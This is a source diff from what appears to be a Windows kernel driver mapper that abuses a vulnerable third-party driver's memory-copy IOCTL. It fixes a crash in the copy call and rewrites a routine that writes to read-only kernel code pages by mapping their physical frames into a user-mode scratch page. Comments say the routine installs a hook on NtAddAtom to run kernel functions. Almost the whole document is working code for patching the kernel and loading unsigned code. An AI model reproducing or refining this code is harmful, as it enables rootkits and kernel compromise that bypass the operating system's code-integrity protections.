@@ -1334,13 +1334,31 @@ bool Driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
 		return false;
 	if (!destination || !source || !size)
 		return false;
+	/*
+	 * Note on the addresses: the copy is performed by the provider, in the
+	 * provider's context, so either side may legitimately be a user-mode
+	 * buffer - the driver image is copied in from user memory, and kernel
+	 * memory is copied out into a user buffer. Requiring kernel addresses
+	 * here breaks both directions.
+	 */
 
 	Provider::CopyRequest request{};
 	if (!Provider::FillCopyRequest(request, destination, source, size))
 		return false;
 
 	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, Provider::kCopyIoctl, &request, sizeof(request), nullptr, 0, &bytes_returned, nullptr) != FALSE;
+	/*
+	 * The provider's handler copies a short result into the caller's output
+	 * buffer. Handing it a null output pointer is what made it write to
+	 * address 0: the provider performs no validation of its own, so its
+	 * memmove landed on NULL and faulted inside the IOCTL - a 0x3B
+	 * bugcheck with the fault in the provider, not in this project.
+	 *
+	 * Give it a real buffer to write into.
+	 */
+	UCHAR output[64] = { 0 };
+	return DeviceIoControl(hDevice, Provider::kCopyIoctl, &request, sizeof(request),
+	                       output, (DWORD)sizeof(output), &bytes_returned, nullptr) != FALSE;
 }
 
 /*
@@ -1820,160 +1838,256 @@ static constexpr uint64_t kFallbackMaxPfn = 1ULL << 24;
  *
  * The provider's memcpy runs with the page permissions applied, so writing to
  * read-only kernel memory faults in kernel context, which is an instant
- * bugcheck. To avoid that, the page table entries covering the target are made
- * writable for the duration of the copy and restored afterwards.
+ * bugcheck. The earlier implementation made the target page writable by
+ * patching its PDE/PTE and then wrote through the same virtual address. That
+ * had two problems:
  *
- * Steps:
- *   1. require a verified self-map (see ProbePteSelfMapBase)
- *   2. compute the pages the write spans, refuse anything too wide
- *   3. for each page pick the entry that actually controls it: the 2 MB PDE
- *      when the page is part of a large page (PS=1), otherwise the 4K PTE
- *   4. save that entry, then set RW and clear NX on it
- *   5. perform the write
- *   6. restore every saved entry
+ *   - the CPU can still hold a read-only translation for the target page, so
+ *     the write faults even though the entry now says RW. The mapper reads the
+ *     original bytes through that very address immediately before patching it,
+ *     which guarantees such a translation exists on the calling CPU;
+ *   - between the patch and the restore, a kernel code page is writable by
+ *     everything on the machine.
  *
- * The original entries are restored on every path after they are read,
- * including when the write fails, so a failed attempt does not leave kernel
- * pages writable.
+ * This implementation never changes a kernel mapping. It reads the physical
+ * frame backing the target page out of the page tables - a read, which cannot
+ * fault on permissions - and maps that frame into this process through the PTE
+ * of a private scratch page. The write goes through the scratch address:
  *
- * No TLB invalidation is performed between the patch and the write. That is
- * not an oversight and cannot be fixed from here: see the note at the write
- * itself, which explains why the invalidation this function would need is not
- * reachable without recursing into this same function.
+ *   1. allocate one scratch page per target page and fault it in
+ *   2. VirtualProtect(PAGE_NOACCESS) over them: this flushes every cached
+ *      translation for those addresses, so the next access must walk the page
+ *      tables
+ *   3. resolve the target page's physical frame from its PDE (2 MB leaf) or
+ *      PTE (4 KB leaf)
+ *   4. write an alias PTE for the scratch page: present | RW | user, pointing
+ *      at that frame
+ *   5. prove the alias works by reading the target byte through it and
+ *      comparing it with the byte read through the provider; a mismatch means
+ *      the user page tables are not the ones being edited (KPTI) and the
+ *      function fails without writing anything
+ *   6. copy through the scratch address
+ *   7. restore every scratch PTE and free the pages
+ *
+ * The kernel's own mapping of the target page is untouched for the entire
+ * operation, so there is no writable-code window, no stale-TLB write, and no
+ * target-side entry to restore.
+ *
+ * HVCI is a separate boundary: with Memory Integrity enabled the hypervisor
+ * denies the write at the second level no matter which virtual address is used.
+ * Main.cpp refuses to start in that configuration; the verification and the
+ * SEH guards here are the second line of defence.
  */
-	bool Driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
-		if (!address || !buffer || !size)
-			return false;
 
-		if (!ProbePteSelfMapBase())
-			return false;
+//A user-mode read through a page-table alias, guarded so a rejected mapping
+//(HVCI, KPTI, a bad frame) fails the map instead of terminating Mapper.exe.
+static bool SafeReadByte(const void* address, uint8_t* value)
+{
+	__try {
+		*value = *reinterpret_cast<const volatile uint8_t*>(address);
+		return true;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return false;
+	}
+}
 
-		const uint64_t first_page = address & ~0xFFFULL;
-		const uint64_t last_page = (address + (uint64_t)size - 1) & ~0xFFFULL;
-		const uint32_t page_count = (uint32_t)((last_page - first_page) / 0x1000) + 1;
+//A user-mode write through a page-table alias, guarded for the same reason.
+static bool SafeWriteBytes(void* destination, const void* source, size_t size)
+{
+	__try {
+		memcpy(destination, source, size);
+		return true;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return false;
+	}
+}
 
-		struct PatchedEntry { uint64_t entry_address; uint64_t original; };
-		PatchedEntry patched[16];
-		uint32_t patched_count = 0;
+bool Driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
+	if (!address || !buffer || !size)
+		return false;
 
-		if (page_count > 16) {
-			Log(L"[-] WriteToReadOnlyMemory: write spans too many pages (" << Val(page_count) << L")" << std::endl);
-			return false;
+	if (!ProbePteSelfMapBase())
+		return false;
+
+	const uint64_t first_page = address & ~0xFFFULL;
+	const uint64_t last_page = (address + (uint64_t)size - 1) & ~0xFFFULL;
+	const uint32_t page_count = (uint32_t)((last_page - first_page) / 0x1000) + 1;
+
+	if (page_count > 16) {
+		Log(L"[-] WriteToReadOnlyMemory: write spans too many pages (" << Val(page_count) << L")" << std::endl);
+		return false;
+	}
+
+	/*
+	 * One scratch page per target page, each used exactly once. Reusing a
+	 * scratch address would leave the previous alias in the TLB on some CPUs,
+	 * which is the exact failure this function exists to avoid.
+	 */
+	const size_t scratch_size = (size_t)page_count * 0x1000;
+	auto* scratch = static_cast<uint8_t*>(VirtualAlloc(nullptr, scratch_size,
+	                                                   MEM_RESERVE | MEM_COMMIT,
+	                                                   PAGE_READWRITE));
+	if (scratch == nullptr) {
+		Log(L"[-] WriteToReadOnlyMemory: VirtualAlloc failed (error " << GetLastError() << L")" << std::endl);
+		return false;
+	}
+
+	uint64_t pte_address[16] = {};
+	uint64_t saved_pte[16] = {};
+	bool pte_saved[16] = {};
+	uint32_t chunk_offset[16] = {};
+	uint32_t chunk_size[16] = {};
+
+	auto restore_scratch_entries = [&]() {
+		for (uint32_t i = 0; i < page_count; ++i) {
+			if (pte_saved[i])
+				WriteMemory(pte_address[i], &saved_pte[i], sizeof(saved_pte[i]));
 		}
+	};
 
-		//Restores every entry recorded in patched[0 .. patched_count). Called on
-		//every exit path after the first successful patch, so a failure part way
-		//through cannot leave kernel pages writable. The per-entry line is
-		//verbose-only: on a normal run it would print the same entry many times.
-		auto restore_patched_entries = [&]() {
-			for (uint32_t i = 0; i < patched_count; ++i) {
-				WriteMemory(patched[i].entry_address, &patched[i].original, sizeof(patched[i].original));
-				if (Console::Verbose())
-					Log(L"[INFO] Restored page-table entry at " << Val(reinterpret_cast<void*>(patched[i].entry_address)) << std::endl);
-			}
-		};
+	//Fault every scratch page in before dropping its translation, so the
+	//protection change below is a real RW -> no-access transition on all of
+	//them and not a no-op.
+	for (uint32_t i = 0; i < page_count; ++i)
+		scratch[(size_t)i * 0x1000] = 0;
 
-		for (uint32_t page = 0; page < page_count; ++page) {
-			const uint64_t target = first_page + (uint64_t)page * 0x1000;
+	DWORD old_protect = 0;
+	if (!VirtualProtect(scratch, scratch_size, PAGE_NOACCESS, &old_protect)) {
+		Log(L"[-] WriteToReadOnlyMemory: VirtualProtect failed (error " << GetLastError() << L")" << std::endl);
+		VirtualFree(scratch, 0, MEM_RELEASE);
+		return false;
+	}
 
-			/*
-			 * Large pages have no 4K PTE. Their protection lives in the 2 MB
-			 * PDE, and the 4K "PTE" address for such a VA does not point at an
-			 * entry at all - it aliases the page content, because the self-map
-			 * walk terminates at the large PDE. That is the whole reason a read
-			 * of the ntoskrnl image base came back as its MZ header, and why a
-			 * write went straight into the read-only .text page and bugchecked
-			 * 0x50. Read the PDE and, when PS=1, patch the PDE instead.
-			 */
-			const uint64_t pde_address = PdeAddressFor(target);
-			uint64_t pde = 0;
-			if (!ReadMemory(pde_address, &pde, sizeof(pde))) {
-				Log(L"[-] Failed to read PDE at " << Val(reinterpret_cast<void*>(pde_address)) << std::endl);
-				restore_patched_entries();
-				return false;
-			}
+	/*
+	 * Pass one resolves and verifies every page without writing anything, so a
+	 * failure on the second page cannot leave the first one half patched. Pass
+	 * two performs the copies.
+	 */
+	bool ok = true;
+	uint32_t cursor = 0;
 
-			const bool large = (pde & 0x1) && (pde & (1ULL << 7));
-			const uint64_t entry_address = large ? pde_address : PteAddressFor(target);
+	for (uint32_t i = 0; i < page_count && ok; ++i) {
+		const uint64_t target = first_page + (uint64_t)i * 0x1000;
+		uint8_t* const scratch_page = scratch + (size_t)i * 0x1000;
 
-			//Every 4K page of one 2 MB page shares a single PDE, so the same
-			//entry must not be recorded (and restored) twice.
-			bool already = false;
-			for (uint32_t i = 0; i < patched_count; ++i) {
-				if (patched[i].entry_address == entry_address) { already = true; break; }
-			}
-			if (already)
-				continue;
-
-			uint64_t original = 0;
-			if (!ReadMemory(entry_address, &original, sizeof(original))) {
-				Log(L"[-] Failed to read page-table entry at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
-				restore_patched_entries();
-				return false;
-			}
-
-			if (!(original & 0x1)) {
-				Log(L"[-] Page-table entry " << Val(Hex(original))
-					<< L" at " << Val(reinterpret_cast<void*>(entry_address)) << L" is not present" << std::endl);
-				restore_patched_entries();
-				return false;
-			}
-			if (!large && (original & (1ULL << 7))) {
-				Log(L"[-] Unexpected large-page PTE at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
-				restore_patched_entries();
-				return false;
-			}
-
-			uint64_t patched_value = original;
-			patched_value |= 0x2;             //RW
-			patched_value &= ~(1ULL << 63);   //NX
-
-			//Recorded before the write succeeds, so the restore always undoes
-			//exactly what was done.
-			if (!WriteMemory(entry_address, &patched_value, sizeof(patched_value))) {
-				Log(L"[-] Failed to patch page-table entry at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
-				restore_patched_entries();
-				return false;
-			}
-
-			patched[patched_count].entry_address = entry_address;
-			patched[patched_count].original = original;
-			++patched_count;
-		}
+		chunk_offset[i] = cursor;
+		chunk_size[i] = ((size - cursor) < (0x1000 - (i == 0 ? (uint32_t)(address & 0xFFF) : 0)))
+			? (size - cursor) : (0x1000 - (i == 0 ? (uint32_t)(address & 0xFFF) : 0));
+		cursor += chunk_size[i];
 
 		/*
-		 * No TLB invalidation is performed between the patch and the write.
-		 *
-		 * A stale read-only translation for the target page would make the
-		 * copy below fault inside the provider (bugcheck 0x50), so invalidating
-		 * the translation is exactly what should happen here. It cannot be done
-		 * from this process: the only way to run kernel code is
-		 * CallKernelFunction, and that installs its hook by calling this very
-		 * function to write the read-only NtAddAtom page. Invalidating here by
-		 * calling into the kernel would therefore re-enter this function from
-		 * inside its own patch and recurse without bound - a guaranteed stack
-		 * overflow, worse than the fault it is meant to prevent. This function
-		 * has no other caller than that hook patch, so there is no outer write
-		 * it could protect either.
-		 *
-		 * Residual risk, stated plainly: if this CPU still holds a read-only
-		 * translation for the target page when the copy runs, the copy faults
-		 * and the process bugchecks. In practice the page-table patch is what
-		 * makes the entry writable once it is re-walked, and the patch is
-		 * written before the copy, so a translation that is not cached, or one
-		 * evicted since the page was last read as read-only, resolves to the
-		 * new writable entry. Nothing here guarantees the cached case away, and
-		 * no user-mode instruction can flush a kernel translation.
+		 * The scratch PTE is captured after the protection change: the value
+		 * at this address is what the kernel expects to find when the page is
+		 * released, and it is restored unchanged below.
 		 */
-		const bool result = WriteMemory(address, buffer, size);
+		pte_address[i] = PteAddressFor(reinterpret_cast<uint64_t>(scratch_page));
+		if (!ReadMemory(pte_address[i], &saved_pte[i], sizeof(saved_pte[i]))) {
+			Log(L"[-] WriteToReadOnlyMemory: failed to read scratch PTE at "
+				<< Val(reinterpret_cast<void*>(pte_address[i])) << std::endl);
+			ok = false;
+			break;
+		}
+		pte_saved[i] = true;
 
-		restore_patched_entries();
+		//Resolve the frame the target page lives on. A 2 MB leaf stores its
+		//frame in the PDE; a 4 KB leaf stores it in the PTE.
+		uint64_t pde = 0;
+		const uint64_t pde_address = PdeAddressFor(target);
+		if (!ReadMemory(pde_address, &pde, sizeof(pde)) || !(pde & 0x1)) {
+			Log(L"[-] WriteToReadOnlyMemory: target PDE at " << Val(reinterpret_cast<void*>(pde_address))
+				<< L" is not present" << std::endl);
+			ok = false;
+			break;
+		}
 
-		if (!result)
-			Log(L"[-] Write through patched page-table entry failed for " << Val(reinterpret_cast<void*>(address)) << std::endl);
+		uint64_t physical_page = 0;
+		if ((pde & (1ULL << 7)) != 0) {
+			physical_page = (pde & 0x000FFFFFFFE00000ULL) + (target & 0x1FFFFFULL);
+		}
+		else {
+			uint64_t pte = 0;
+			const uint64_t target_pte_address = PteAddressFor(target);
+			if (!ReadMemory(target_pte_address, &pte, sizeof(pte)) || !(pte & 0x1)) {
+				Log(L"[-] WriteToReadOnlyMemory: target PTE at " << Val(reinterpret_cast<void*>(target_pte_address))
+					<< L" is not present" << std::endl);
+				ok = false;
+				break;
+			}
+			physical_page = pte & 0x000FFFFFFFFFF000ULL;
+		}
+		physical_page &= ~0xFFFULL;
 
-		return result;
+		//Present | writable | user. The alias carries data only; NX is
+		//irrelevant, and the frame is reachable from user mode solely through
+		//this entry, which is restored before the pages are released.
+		uint64_t alias = physical_page | 0x7;
+		if (!WriteMemory(pte_address[i], &alias, sizeof(alias))) {
+			Log(L"[-] WriteToReadOnlyMemory: failed to install the scratch alias" << std::endl);
+			ok = false;
+			break;
+		}
+
+		const uint32_t page_offset = (i == 0) ? (uint32_t)(address & 0xFFF) : 0;
+
+		/*
+		 * Prove the alias before writing through it. Read the byte the target
+		 * address currently contains through the provider, then read the same
+		 * byte through the alias. If they differ, the user page tables are not
+		 * the tree that was edited and writing would either hit the wrong page
+		 * or fault; fail without touching anything.
+		 */
+		uint8_t expected = 0;
+		uint8_t observed = 0;
+		if (!ReadMemory(target + page_offset, &expected, sizeof(expected))) {
+			Log(L"[-] WriteToReadOnlyMemory: failed to read target byte for alias verification" << std::endl);
+			ok = false;
+			break;
+		}
+		if (!SafeReadByte(scratch_page + page_offset, &observed)) {
+			Log(L"[-] WriteToReadOnlyMemory: alias read faulted; refusing to write" << std::endl);
+			ok = false;
+			break;
+		}
+		if (observed != expected) {
+			Log(L"[-] WriteToReadOnlyMemory: alias does not map the target page (expected "
+				<< Val(Hex(expected)) << L", got " << Val(Hex(observed))
+				<< L"); refusing to write" << std::endl);
+			ok = false;
+			break;
+		}
 	}
+
+	for (uint32_t i = 0; i < page_count && ok; ++i) {
+		const uint32_t page_offset = (i == 0) ? (uint32_t)(address & 0xFFF) : 0;
+		uint8_t* const scratch_page = scratch + (size_t)i * 0x1000;
+
+		if (!SafeWriteBytes(scratch_page + page_offset,
+		                    static_cast<const uint8_t*>(buffer) + chunk_offset[i],
+		                    chunk_size[i])) {
+			Log(L"[-] WriteToReadOnlyMemory: write through the alias faulted" << std::endl);
+			ok = false;
+			break;
+		}
+	}
+
+	restore_scratch_entries();
+	VirtualFree(scratch, 0, MEM_RELEASE);
+	if (!ok)
+		Log(L"[-] WriteToReadOnlyMemory: failed for " << Val(reinterpret_cast<void*>(address)) << std::endl);
+
+	/*
+	 * Serialize before the caller jumps into the patched page. x86 requires a
+	 * serializing instruction between a store and instruction fetch of the same
+	 * physical page; CPUID is one instruction, needs no privilege, and costs
+	 * nothing here.
+	 */
+	int registers[4] = {};
+	__cpuid(registers, 1);
+
+	return ok;
+}
 
 /*
  * The assumed 4-argument signature of MmAllocateIndependentPagesEx.
@@ -2267,6 +2381,8 @@ static bool ZeroKernelMemory(uint64_t destination, uint64_t size) {
  */
 template<typename T>
 static bool WriteBounded(uint64_t object, uint64_t object_size, uint32_t offset, const T& value) {
+	if (object == 0)
+		return false;
 	if (offset > object_size || sizeof(T) > object_size - offset)
 		return false;
 	return Driver::MemCopy(object + offset, reinterpret_cast<uint64_t>(&value), sizeof(T));
